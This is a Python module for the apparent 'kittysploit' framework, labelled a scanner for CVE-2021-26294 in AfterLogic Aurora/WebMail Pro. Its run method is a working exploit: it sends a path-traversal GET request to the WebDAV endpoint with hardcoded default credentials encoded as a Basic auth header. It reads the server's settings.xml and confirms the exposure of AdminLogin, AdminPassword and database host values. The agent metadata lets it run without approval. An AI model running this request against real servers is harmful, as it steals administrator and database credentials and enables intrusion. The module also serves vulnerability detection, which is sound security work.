#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""AfterLogic Aurora and WebMail Pro products with 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'AfterLogic Aurora and WebMail Pro < 7.7.9 - Information Disclosure Detection',
        'description': 'AfterLogic Aurora and WebMail Pro products with 7.7.9 and all lower versions are affected by this vulnerability, simply sending an HTTP GET request to WebDAV EndPoint with built-in “caldav_public_user@localhost” and it’s the predefined password “caldav_public_user” allows the attacker to read all files under the web root.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'afterlogic', 'exposure', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/E3SEC/AfterLogic/blob/main/CVE-2021-26294-exposure-of-sensitive-information-vulnerability.md',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-26294',
            'https://github.com/Threekiii/Awesome-POC',
            'https://github.com/soosmile/POC',
            'https://github.com/tzwlhack/Vulnerability',
        ],
        'cve': 'CVE-2021-26294',
    }

    def run(self):
        path = '/dav/server.php/files/personal/%2e%2e/%2e%2e//%2e%2e//%2e%2e/data/settings/settings.xml'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Authorization': 'Basic Y2FsZGF2X3B1YmxpY191c2VyQGxvY2FsaG9zdDpjYWxkYXZfcHVibGljX3VzZXI'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<AdminLogin>', '<AdminPassword>', '<DBHost>',)
        header_any = ('application/octet-stream',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='high', reason='AfterLogic Aurora and WebMail Pro < 7.7.9 - Information Disclosure detected', path=path)
            return True
        return False

